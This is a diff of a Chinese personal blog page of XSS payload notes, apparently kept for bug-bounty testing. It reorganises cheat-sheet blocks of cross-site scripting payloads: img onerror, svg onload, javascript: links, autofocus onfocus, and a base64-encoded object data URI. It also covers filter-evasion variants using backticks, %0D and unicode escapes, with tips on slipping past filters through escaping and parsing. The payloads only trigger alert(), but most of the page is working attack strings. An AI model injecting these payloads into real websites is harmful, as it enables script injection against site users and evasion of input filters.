@@ -21,16 +21,16 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.21.1","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideDownBigOut"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="XXS简单payload注：html解析HTML 实体编码 ​	例如： 1&amp;quot;   html解码成	&quot;  注：JavaScript Unicode 转义（\uXXXX） 和 URL 编码（%XX） xxs需要注意被墙了可以尝试从转义或者解析角度注入 可以通过网址来查看以前大佬们提交的漏洞">
+    <meta name="description" content="XXS简单payload注：html解析HTML 实体编码 ​	例如： 1&amp;quot;   html解码成	&quot;  注：JavaScript Unicode 转义（\uXXXX） 和 URL 编码（%XX） xxs需要注意被墙了可以尝试从转义或者解析角度注入 当然文件预览的方向也可以尝试 可以通过网址来查看以前大佬们提交的漏洞">
 <meta property="og:type" content="article">
 <meta property="og:title" content="payload记录">
 <meta property="og:url" content="http://example.com/2025/04/24/payload%E8%AE%B0%E5%BD%95/index.html">
 <meta property="og:site_name" content="乌篷船的博客">
-<meta property="og:description" content="XXS简单payload注：html解析HTML 实体编码 ​	例如： 1&amp;quot;   html解码成	&quot;  注：JavaScript Unicode 转义（\uXXXX） 和 URL 编码（%XX） xxs需要注意被墙了可以尝试从转义或者解析角度注入 可以通过网址来查看以前大佬们提交的漏洞">
+<meta property="og:description" content="XXS简单payload注：html解析HTML 实体编码 ​	例如： 1&amp;quot;   html解码成	&quot;  注：JavaScript Unicode 转义（\uXXXX） 和 URL 编码（%XX） xxs需要注意被墙了可以尝试从转义或者解析角度注入 当然文件预览的方向也可以尝试 可以通过网址来查看以前大佬们提交的漏洞">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/image/xss/expected_request.png">
 <meta property="article:published_time" content="2025-04-23T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-12-11T02:57:04.755Z">
+<meta property="article:modified_time" content="2025-12-17T06:18:50.892Z">
 <meta property="article:author" content="乌篷船">
 <meta property="article:tag" content="payload">
 <meta name="twitter:card" content="summary">
@@ -249,7 +249,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-12-11 10:57:04" itemprop="dateModified" datetime="2025-12-11T10:57:04+08:00">2025-12-11</time>
+      <time title="修改时间：2025-12-17 14:18:50" itemprop="dateModified" datetime="2025-12-17T14:18:50+08:00">2025-12-17</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -268,7 +268,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>2.2k</span>
+      <span>2.5k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -291,6 +291,7 @@
 
 <p>注：<strong>JavaScript Unicode 转义（\uXXXX）</strong> 和 <strong>URL 编码（%XX）</strong></p>
 <p>xxs需要注意被墙了可以尝试从转义或者解析角度注入</p>
+<p>当然文件预览的方向也可以尝试</p>
 <p>可以通过<a target="_blank" rel="noopener" href="https://hackerone.com/hacktivity/cwe_discovery?id=CWE-79">网址</a>来查看以前大佬们提交的漏洞</p>
 <span id="more"></span>
 
@@ -304,12 +305,13 @@
 
 <h5 id="图片名称变更"><a href="#图片名称变更" class="headerlink" title="图片名称变更"></a>图片名称变更</h5><p>payload:       \ “&gt;&lt;img src&#x3D;1 onerror&#x3D;&quot; URL&#x3D;String;</p>
 <p><img src="/../image/xss/expected_request.png"></p>
-<h5 id="常见xss的payload"><a href="#常见xss的payload" class="headerlink" title="常见xss的payload"></a>常见xss的payload</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;+onmouseover=alert/*abcd*/`xss`</span><br></pre></td></tr></table></figure>
+<h5 id="常见xss的payload"><a href="#常见xss的payload" class="headerlink" title="常见xss的payload"></a>常见xss的payload</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">   #标签外常用#base64加密</span><br><span class="line">   &quot;&lt;object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&gt;&lt;/object&gt;&quot;</span><br><span class="line">   #img#强制错误弹</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">   #svg#强制错误弹</span><br><span class="line">   &lt;svg onload=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">   #点击</span><br><span class="line">   &lt;a href=&quot;javascript:alert(&#x27;xxx&#x27;)&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">   &lt;a data-url=&quot;&quot; onclick=&quot;alert(&#x27;xxx&#x27;)&quot;&gt;xss&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">   #normal</span><br><span class="line">   &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">   #鼠标移动</span><br><span class="line">   &lt;a onmousemove=&quot;alert(1)&quot;&gt;hover me&lt;/a&gt;</span><br><span class="line">   &lt;a onmousemove=&quot;alert(1)&quot; style=&quot;display:block;width:200px;height:50px;background:red&quot;&gt;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   #特定标签</span><br><span class="line">   &lt;iframe src=about:blank onload=alert(1)&gt;&lt;/iframe&gt;</span><br><span class="line">   </span><br><span class="line">   #强制本页无限弹窗</span><br><span class="line">   #聚焦时弹xss，强制聚焦</span><br><span class="line">   &lt;input autofocus onfocus=alert(1)&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>; alert<span class="string">`1`</span>; <span class="comment">//&quot;;</span></span><br><span class="line"><span class="number">0</span>||alert%0D<span class="string">`1`</span><span class="comment">//</span></span><br><span class="line">%0a<span class="string">`<span class="subst">$&#123;alert%0D(<span class="number">1</span>)&#125;</span>`</span></span><br><span class="line">onload=alert<span class="string">`1`</span> <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">\u0022\u003b+alert\u00601\u0060\u003b+<span class="comment">//</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#常见反射型</span><br><span class="line">	&quot;+onmouseover=alert/*abcd*/`xss`</span><br><span class="line">	</span><br><span class="line">	&quot;&quot;; alert`<span class="number">1</span>`; //&quot;;</span><br><span class="line">	<span class="number">0</span>||alert<span class="variable">%0D`1`//</span></span><br><span class="line"><span class="variable">	%</span><span class="number">0</span>a`$&#123;alert%<span class="number">0</span>D(<span class="number">1</span>)&#125;`</span><br><span class="line">	onload=alert`<span class="number">1</span>` //</span><br><span class="line"></span><br><span class="line">#流程中含有转义步骤</span><br><span class="line">	\u0022\u003b+alert\u00601\u0060\u003b+//</span><br></pre></td></tr></table></figure>
 
-<hr>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#normal</span><br><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line">#img</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">#svg</span><br><span class="line">&lt;svg onload=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">    </span><br><span class="line">#标签</span><br><span class="line">&lt;aaaa id=&quot;c&quot; onfocus=&quot;alert(1)&quot; tabindex=0&gt;</span><br><span class="line">        </span><br><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&lt;a href=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;Click me&lt;/a&gt;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">#鼠标移动</span><br><span class="line">&lt;a onmousemove=\&quot;alert(1)\&quot;&gt;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">#base64加密</span><br><span class="line">    </span><br><span class="line">    &quot;&lt;object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&gt;&lt;/object&gt;&quot;</span><br><span class="line">  </span><br></pre></td></tr></table></figure>
+
+
+
 
 <h3 id="若响应包存在请求头-application-javascript"><a href="#若响应包存在请求头-application-javascript" class="headerlink" title="若响应包存在请求头     application&#x2F;javascript"></a>若响应包存在请求头     application&#x2F;javascript</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通杀测试</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;http://xxxxx/xss/xss.gif&#x27;</span> <span class="attr">alt</span>=<span class="string">&#x27;Smiley face&#x27;</span> <span class="attr">width</span>=<span class="string">&#x27;32&#x27;</span> <span class="attr">height</span>=<span class="string">&#x27;32&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
